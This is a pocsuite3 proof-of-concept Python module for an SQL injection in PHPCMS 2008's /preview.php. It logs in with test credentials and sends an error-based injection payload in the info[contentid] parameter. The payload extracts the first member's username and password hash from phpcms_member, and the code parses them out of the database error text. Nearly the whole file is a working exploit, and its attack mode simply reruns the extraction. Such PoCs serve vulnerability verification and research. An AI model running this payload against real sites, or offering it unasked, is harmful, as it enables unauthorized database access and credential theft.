"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import re

from pocsuite3.api import Output, POCBase, register_poc, requests


class DemoPOC(POCBase):
    vulID = '1145'  # ssvid
    version = '1'
    author = ['chenghs@knownsec.com']
    vulDate = '2013-04-18'
    createDate = '2013-12-16'
    updateDate = '2013-12-16'
    references = ['http://www.wooyun.org/bugs/wooyun-2013-022112']
    name = 'PHPCMS 2008 /preview.php SQL注入漏洞 POC'
    appPowerLink = 'http://www.phpcms.cn'
    appName = 'phpcms'
    appVersion = '2008#'
    vulType = 'SQL Injection'
    desc = '''
                    PHPCMS 2008 /preview.php 文件参数info字段没有合适的过滤，导致SQL注入漏洞。
                    '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result = {}
        payload = "/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2'%20and%20(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,0x27,username,0x3a,password,0x27,0x7e)%20from%20phpcms_member%20limit%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)--%20a"
        login_path = self.url + "/member/login.php"
        data = {"username": "test", "password": "test123", "timeout": "31536000", "dosubmit": "1"}

        with requests.sessions.Session() as session:
            session.request(method='post', url=login_path, data=data)
            content = session.request(url=self.url + payload, method='get').text
        if not content:
            return self.parse_output(result)

        reg = re.compile("Duplicate entry '~'(.*?)'~1' for key 'group_key'")
        res = reg.findall(content)
        if res:
            result['AdminInfo'] = {}
            result['AdminInfo']['Password'] = res[0]

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()

    def _shell(self):
        pass


register_poc(DemoPOC)
